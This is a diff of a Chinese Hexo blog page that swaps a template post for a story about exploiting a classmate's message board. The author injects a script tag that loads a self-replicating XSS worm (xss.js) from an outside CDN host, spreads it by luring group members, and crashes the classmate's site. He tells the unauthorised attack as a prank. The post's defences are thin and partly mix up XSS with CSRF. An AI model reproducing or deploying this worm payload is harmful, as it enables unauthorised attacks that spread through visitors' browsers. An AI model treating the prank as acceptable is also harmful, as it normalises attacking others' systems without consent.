@@ -3,21 +3,43 @@
 <head>
   <meta charset="utf-8">
   
-  <title>Hello World | Zero&#39;s Corner</title>
+  <title>hey 接好了, 小王同学的XSS栗子 | Zero&#39;s Corner</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick">
+  <meta name="description" content="又是一个神清气爽的假日上午, 慵懒地睡到12点自然醒的感觉真是舒服. 正准备起床刷个牙, 慢悠悠的去学校外面吃点好的~ 这个时候, QQ上收到了小王同学的求助消息: 
+
+大婶, 帮个忙, ajax没法用了也0.0 (省略balabala代码一坨)
+(爷还没起床呢, 哪凉快哪呆着去- -) 我先刷个牙, ~等会嘛
+好嘞
+
+赖了会床, 洗漱完毕又顺带跟对门寝室搞了会ji之后, 于电脑前, 坐毕, 开始">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://blog.zeroling.com/2016/02/18/hello-world/index.html">
+<meta property="og:title" content="hey 接好了, 小王同学的XSS栗子">
+<meta property="og:url" content="https://blog.zeroling.com/2014/06/02/an-example-of-xss/index.html">
 <meta property="og:site_name" content="Zero's Corner">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick">
-<meta property="og:updated_time" content="2016-02-18T13:13:12.000Z">
+<meta property="og:description" content="又是一个神清气爽的假日上午, 慵懒地睡到12点自然醒的感觉真是舒服. 正准备起床刷个牙, 慢悠悠的去学校外面吃点好的~ 这个时候, QQ上收到了小王同学的求助消息: 
+
+大婶, 帮个忙, ajax没法用了也0.0 (省略balabala代码一坨)
+(爷还没起床呢, 哪凉快哪呆着去- -) 我先刷个牙, ~等会嘛
+好嘞
+
+赖了会床, 洗漱完毕又顺带跟对门寝室搞了会ji之后, 于电脑前, 坐毕, 开始">
+<meta property="og:image" content="https://dn-redrock.qbox.me/pics/xss-origin.png-cover">
+<meta property="og:image" content="https://dn-redrock.qbox.me/pics/xss-origin.png">
+<meta property="og:image" content="https://dn-redrock.qbox.me/pics/input-xss.png">
+<meta property="og:image" content="https://dn-redrock.qbox.me/pics/alert-xss.png">
+<meta property="og:image" content="https://dn-redrock.qbox.me/pics/sendmessage.png">
+<meta property="og:image" content="https://dn-redrock.qbox.me/pics/wcz.png">
+<meta property="og:image" content="https://dn-redrock.qbox.me/pics/last.jpg">
+<meta property="og:updated_time" content="2015-12-30T15:44:19.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.
-Quick">
+<meta name="twitter:title" content="hey 接好了, 小王同学的XSS栗子">
+<meta name="twitter:description" content="又是一个神清气爽的假日上午, 慵懒地睡到12点自然醒的感觉真是舒服. 正准备起床刷个牙, 慢悠悠的去学校外面吃点好的~ 这个时候, QQ上收到了小王同学的求助消息: 
+
+大婶, 帮个忙, ajax没法用了也0.0 (省略balabala代码一坨)
+(爷还没起床呢, 哪凉快哪呆着去- -) 我先刷个牙, ~等会嘛
+好嘞
+
+赖了会床, 洗漱完毕又顺带跟对门寝室搞了会ji之后, 于电脑前, 坐毕, 开始">
   
     <link rel="alternative" href="/atom.xml" title="Zero&#39;s Corner" type="application/atom+xml">
   
@@ -63,10 +85,10 @@ Quick">
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-an-example-of-xss" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/02/18/hello-world/" class="article-date">
-  <time datetime="2016-02-18T13:13:12.000Z" itemprop="datePublished">2016-02-18</time>
+    <a href="/2014/06/02/an-example-of-xss/" class="article-date">
+  <time datetime="2014-06-02T07:55:08.000Z" itemprop="datePublished">2014-06-02</time>
 </a>
     
   </div>
@@ -77,7 +99,7 @@ Quick">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      hey 接好了, 小王同学的XSS栗子
     </h1>
   
 
@@ -85,41 +107,90 @@ Quick">
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <p><img src="https://dn-redrock.qbox.me/pics/xss-origin.png-cover" alt="cover-image"><br>又是一个神清气爽的假日上午, 慵懒地睡到12点自然醒的感觉真是舒服. 正准备起床刷个牙, 慢悠悠的去学校外面吃点好的~ 这个时候, QQ上收到了小王同学的求助消息: </p>
+<ul>
+<li>大婶, 帮个忙, ajax没法用了也0.0 (省略balabala代码一坨)</li>
+<li>(爷还没起床呢, 哪凉快哪呆着去- -) 我先刷个牙, ~等会嘛</li>
+<li>好嘞</li>
+</ul>
+<p>赖了会床, 洗漱完毕又顺带跟对门寝室搞了会ji之后, 于电脑前, 坐毕, 开始看小王童鞋发来的东西. </p>
+<p>(我去, 这神马玩意儿, jQ 跟原生 js 各种搞基… 阅毕, 无法忍… ) </p>
+<p>(遂让小王同学给个网址过来慢慢品翔..)</p>
+<ul>
+<li>hey, 大婶, 你要的地址</li>
+<li>(啪, 一个公网地址飞了过来)</li>
+</ul>
+<p>(输完回车的瞬间, 哔, 一个 Alert 吓了我一尿, 噢噢它告诉我我叫<code>403号访客</code>, 好吧..叫神马不要紧, 我从容地点了确定, 紧接着一个<del>巨丑无比的</del>网页出现了, 还是教务在线的味道, 还是上个世纪的配方!)</p>
+<p>我定睛一看! 咦, 这里有一个<del>错位的</del>留言板也</p>
+<p><img src="https://dn-redrock.qbox.me/pics/xss-origin.png" alt="留言板"></p>
+<p>hiahia. 那我就来帮你测测能不能留言呗</p>
+<p><img src="https://dn-redrock.qbox.me/pics/input-xss.png" alt="input-xss"></p>
+<p>刷新之后</p>
+<p> <img src="https://dn-redrock.qbox.me/pics/alert-xss.png" alt="alert"></p>
+<p>还真能留言! 熟悉的框框出现了(貌似泄露IP了0.0)</p>
+<p>我们审查一下ajax部分的代码.</p>
+<p>点击发送之后我们就来到了这个函数.</p>
+<p><img src="https://dn-redrock.qbox.me/pics/sendmessage.png" alt="function"></p>
+<p>瞬间我就邪恶了→_→ 今天就来好好的调戏一下小王童鞋呗.</p>
+<p>于是我啪啪啪在记事本里面敲下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">'message_input'</span>).value = <span class="string">"&lt;script src='http://redrock.u.qiniudn.com/xss.js'&gt;&lt;/script&gt;http://www.zeroling.com/喵″"</span>;</span><br><span class="line">	sendMessage();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>并把这个文件命名为 xss.js 上传到云存储去.</p>
+<p>万事具备只欠东风了喵.</p>
+<p>引发这个XSS蠕虫就差一步: </p>
+<p>在小王童鞋的留言板中输入 <code>&lt;script src=&#39;http://redrock.u.qiniudn.com/xss.js&#39;&gt;&lt;/script&gt;</code></p>
+<p>然后跑到群里吼了一句</p>
+<p><img src="https://dn-redrock.qbox.me/pics/wcz.png" alt="wcz"></p>
+<p>于是乎, 蠕虫出动了!</p>
+<p>小王童鞋的站站立马就被玩坏了.</p>
+<p><img src="https://dn-redrock.qbox.me/pics/last.jpg" alt="last"></p>
+<p>大家的浏览器争相向小王的服务器发送”留言”, 不久就看到了小王在群里抱怨电脑死机的事情0.0 (我没想到会死机的呀.)</p>
+<hr>
+<p>##跨站脚本攻击<br>简单的说, 攻击者以你的浏览器发送恶意请求, 这些请求可以是恶意的, 比如发送文章, 邮件, 删除文章, 甚至购买商品, 盗取账号等等. </p>
+<p>貌似这种攻击方式并少见, 但是危害不容小觑. 尤其是在当今 SNS2.0 时代, 大量用户盘踞的社交圈一旦爆出这种漏洞, 蠕虫就可以在短时间内疯狂蔓延, 使得整个社区充斥垃圾甚至诈骗信息.</p>
+<p>####通俗一点的例子:<br>假设我有一个微博网站, 它有一个发私信的接口: <code>http://myweibo.com/api/message?msg=balabala&amp;to=bala</code>, 这里的参数<code>msg</code>表示要发送的内容, <code>to</code>是要发送的对象. </p>
+<p>正常情况下, 你登陆这个微博之后会得到一个Cookie, 而在进行发私信请求的时候, 这个Cookie会顺便被带上交给服务器, 服务器则通过这个Cookie来认证你, 如果正确就发送私信给别人.</p>
+<p>OK, 一天一个黑客菊苣发现了这个微博网站的 XSS 漏洞, 他正好缺钱….</p>
+<p>然后他就开始想歪主意, 他发了一篇有关波姐的微博(各种福利啊0.0), 然后在其中包含了漏洞利用的 payload. </p>
+<p>于是<del>小王同学</del>(还是小李把)小李同学看到了这个微博, 漏洞被触发了, 黑客菊苣写的代码会让小李的浏览器以小李的名义(Cookie)转发这条微博并发送私信给小李的所有好友, 内容大概是</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好哥们, 我最近遇到点balabala, ........, 打到我支付宝号上<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>叭, 下礼拜一定还!</span><br></pre></td></tr></table></figure>
+<p>然后结果大概是, 黑客菊苣坐在黑暗的角落里面望着显示器露出邪恶的笑容→_→…</p>
+<p>####如何避免</p>
+<ol>
+<li>在表单里增加Hash值</li>
+<li>验证码(貌似跟上面原理一致)</li>
+<li>避免漏洞</li>
+<li>各种高端的我也不懂啊T.T</li>
+</ol>
+<p>想一想，当我们用鼠标在 Blog/BBS/WebMail 点击别人留下的链接的时候, 说不定一场精心准备的 XSS 攻击正等着我们. </p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://blog.zeroling.com/2016/02/18/hello-world/" data-id="ciksc9aj40018chojptmz6psl" class="article-share-link">Share</a>
+      <a data-url="https://blog.zeroling.com/2014/06/02/an-example-of-xss/" data-id="ciksc9aj10015chojvce8816o" class="article-share-link">Share</a>
       
       
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">
+- XSS</a></li></ul>
+
     </footer>
   </div>
   
     
 <nav id="article-nav">
   
-    <a href="/2016/02/18/Hello-Hexo/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2014/09/10/li-yong-shu-zi-gong-si-cdn-jie-jue-googleapi-wu-fa-fang-wen-de-wen-ti/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          Hello Hexo
+          利用数字公司 CDN 解决 GoogleApi 无法访问的问题
         
       </div>
     </a>
   
   
-    <a href="/2015/12/28/2015nian-de-nian-zhong-zong-jie/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2014/06/01/the-usage-of-pjax/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">2015年的年终总结</div>
+      <div class="article-nav-title">Ajax真的只能用来局部刷新吗?</div>
     </a>
   
 </nav>
